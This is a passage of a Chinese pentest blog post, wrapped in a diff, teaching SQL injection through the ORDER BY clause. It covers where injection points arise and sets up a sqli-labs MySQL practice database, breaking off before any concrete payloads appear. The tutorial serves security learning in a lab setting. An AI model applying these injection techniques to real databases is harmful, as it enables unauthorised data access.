@@ -1,0 +1,832 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>019-SQL注入之OrderBy位置点注入 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html
+"><meta name="keywords" content='SQLi'>
+  <meta itemprop="name" content="019-SQL注入之OrderBy位置点注入">
+  <meta itemprop="description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html">
+  <meta itemprop="datePublished" content="2023-07-28T15:20:04+08:00">
+  <meta itemprop="dateModified" content="2023-07-28T15:20:04+08:00">
+  <meta itemprop="wordCount" content="3407">
+  <meta itemprop="keywords" content="SQLi"><meta property="og:url" content="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="019-SQL注入之OrderBy位置点注入">
+  <meta property="og:description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-07-28T15:20:04+08:00">
+    <meta property="article:modified_time" content="2023-07-28T15:20:04+08:00">
+    <meta property="article:tag" content="SQLi">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="019-SQL注入之OrderBy位置点注入">
+  <meta name="twitter:description" content="本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。
+原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" title="019-SQL注入之OrderBy位置点注入 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Bgroupby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/" title="018-SQL注入之GroupBy位置点注入" /><link rel="next" type="text/html" href="http://localhost:1313/posts/revshell/" title="020-RevShell：一款好用的生成反弹Shell命令的工具" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5/index.md" title="019-SQL注入之OrderBy位置点注入 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "019-SQL注入之OrderBy位置点注入",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5\/"
+    },"genre": "posts","keywords": "SQLi","wordcount":  3407 ,
+    "url": "http:\/\/localhost:1313\/posts\/sql%E6%B3%A8%E5%85%A5%E4%B9%8Borderby%E4%BD%8D%E7%BD%AE%E7%82%B9%E6%B3%A8%E5%85%A5\/","datePublished": "2023-07-28T15:20:04+08:00","dateModified": "2023-07-28T15:20:04+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>019-SQL注入之OrderBy位置点注入</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/pentest/" class="post-category" title="分类 - Pentest"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pentest</a></span></div><div class="post-meta-line"><span title="发布于 2023-07-28 15:20:04"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-07-28">2023-07-28</time></span>&nbsp;<span title="3407 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 3500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 7 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#order-by简介">order by简介</a>
+      <ul>
+        <li><a href="#语法">语法</a></li>
+      </ul>
+    </li>
+    <li><a href="#order-by-注入">order by 注入</a>
+      <ul>
+        <li><a href="#1本地环境">1、本地环境</a></li>
+        <li><a href="#2获取字段数">2、获取字段数</a></li>
+        <li><a href="#3联合注入罕见">3、联合注入(罕见)</a></li>
+        <li><a href="#4报错注入">4、报错注入</a>
+          <ul>
+            <li><a href="#1xpath报错">1）XPath报错</a></li>
+            <li><a href="#2geohash报错">2）Geohash报错</a></li>
+            <li><a href="#3gtid报错">3）GTID报错</a></li>
+            <li><a href="#4duplicate-key报错">4）Duplicate key报错</a></li>
+          </ul>
+        </li>
+        <li><a href="#5布尔盲注">5、布尔盲注</a>
+          <ul>
+            <li><a href="#1if">1）IF</a></li>
+            <li><a href="#2rand">2）rand</a></li>
+            <li><a href="#3位运算符">3）位运算符</a></li>
+          </ul>
+        </li>
+        <li><a href="#6时间盲注">6、时间盲注</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>本篇文章作者Xavier，本文属i春秋原创奖励计划，首发于i春秋论坛，未经许可禁止转载。</p>
+<p>原文地址：https://bbs.ichunqiu.com/thread-63491-1-1.html</p>
+<p>之前一篇文章讲了GROUP BY 位置点的注入，这次讲下ORDER BY位置点的注入。</p>
+<h2 id="order-by简介" class="heading-element"><span>order by简介</span>
+  <a href="#order-by%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>ORDER BY语句是SQL语法中用于对查询结果进行排序的子句。它可以按照一个或多个列的值进行升序（ASC）或降序（DESC）排序。</p>
+<h3 id="语法" class="heading-element"><span>语法</span>
+  <a href="#%e8%af%ad%e6%b3%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>ORDER BY子句通常紧跟在SELECT语句的最后，用于指定排序的规则。下面是ORDER BY语句的一般语法形式：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">column_name</span><span class="p">,</span><span class="w"> </span><span class="k">function</span><span class="p">(</span><span class="k">column_name</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">FROM</span><span class="w"> </span><span class="k">table_name</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">WHERE</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">operator</span><span class="w"> </span><span class="n">value</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">column_name1</span><span class="w"> </span><span class="p">[</span><span class="k">ASC</span><span class="o">|</span><span class="k">DESC</span><span class="p">],</span><span class="w"> </span><span class="n">column_name2</span><span class="w"> </span><span class="p">[</span><span class="k">ASC</span><span class="o">|</span><span class="k">DESC</span><span class="p">],</span><span class="w"> </span><span class="p">...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LIMIT</span><span class="w"> </span><span class="n">num</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>在ORDER BY子句中，可以指定一个或多个列作为排序的依据。按照指定的列顺序进行排序，每个列可以指定是升序（ASC）还是降序（DESC），默认是升序排序。</p>
+<p>以下是一些常见的用法和注意事项：</p>
+<ol>
+<li>排序单个列：可以通过列名指定要排序的列。例如，<code>ORDER BY 列名 ASC</code>表示按升序对该列进行排序，<code>ORDER BY 列名 DESC</code>表示按降序对该列进行排序。</li>
+<li>排序多个列：可以按照多个列进行排序，多个列之间用逗号分隔。排序优先级按照列在ORDER BY子句中的顺序确定。</li>
+<li>NULL值处理：在排序中，默认情况下NULL值会被视为最小值（升序排序）或最大值（降序排序）。可以使用NULLS FIRST或NULLS LAST指定NULL值在排序中的位置。</li>
+<li>表达式排序：除了列名外，还可以使用表达式作为排序的依据。例如，可以使用函数、算术表达式或条件表达式进行排序。</li>
+<li>排序方向：默认情况下，排序是升序的。可以使用ASC或DESC关键字明确指定排序方向。ASC表示升序（默认），DESC表示降序。</li>
+</ol>
+<p>ORDER BY语句在查询结果中对记录进行排序，提供了灵活的排序功能，可以根据需要对结果集进行定制化排序。它对于按特定条件获取有序结果非常有用，例如按照日期、数值大小或字母顺序进行排序。</p>
+<h2 id="order-by-注入" class="heading-element"><span>order by 注入</span>
+  <a href="#order-by-%e6%b3%a8%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>通常order by注入有两个可能点，一个是列名（id）可控，一个是排序方向（desc）可控。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from table order by id desc</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果只能控制desc这个位置的参数，我们需要利用SQL语法的特性，通过拼接 <code>desc,&lt;column&gt;</code>的形式控制列名作为注入点，即：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">select * from table order by id desc, column_name</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="1本地环境" class="heading-element"><span>1、本地环境</span>
+  <a href="#1%e6%9c%ac%e5%9c%b0%e7%8e%af%e5%a2%83" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>以MySQL为例进行讲解。</p>
+<p>下面演示用到2个数据库，MySQL 5.7.26和MySQL8.0.31</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">#</span><span class="w"> </span><span class="n">sqli</span><span class="o">-</span><span class="n">labs</span><span class="w"> </span><span class="err">数据库，版本</span><span class="mi">5</span><span class="p">.</span><span class="mi">7</span><span class="p">.</span><span class="mi">26</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">password</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">Dumb</span><span class="w">       </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Angelina</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">I</span><span class="o">-</span><span class="n">kill</span><span class="o">-</span><span class="n">you</span><span class="w"> </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">3</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Dummy</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="n">p</span><span class="o">@</span><span class="n">ssword</span><span class="w">   </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">4</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">secure</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">crappy</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">stupid</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">stupidity</span><span class="w">  </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">6</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">superman</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">genious</span><span class="w">    </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">7</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">batman</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">mob</span><span class="o">!</span><span class="n">le</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">8</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">    </span><span class="o">|</span><span class="w"> </span><span class="k">admin</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w">  </span><span class="mi">9</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin2</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">11</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">dhakkan</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">dumbo</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin4</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">|</span><span class="w"> </span><span class="mi">13</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">admin1</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">admin3</span><span class="w">     </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+----------+------------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="mi">14</span><span class="w"> </span><span class="k">rows</span><span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="p">.</span><span class="mi">01</span><span class="w"> </span><span class="n">sec</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">#</span><span class="w"> </span><span class="err">自建数据库，版本</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">31</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="o">|</span><span class="w"> </span><span class="n">id</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">name</span><span class="w">   </span><span class="o">|</span><span class="w"> </span><span class="n">pass</span><span class="w">     </span><span class="o">|</span><span class="w"> </span><span class="n">age</span><span class="w">  </span><span class="o">|</span><span class="w"> </span><span class="n">area</span><span class="w">      </span><span class="o">|</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">+</span><span class="c1">----+--------+----------+------+-----------+
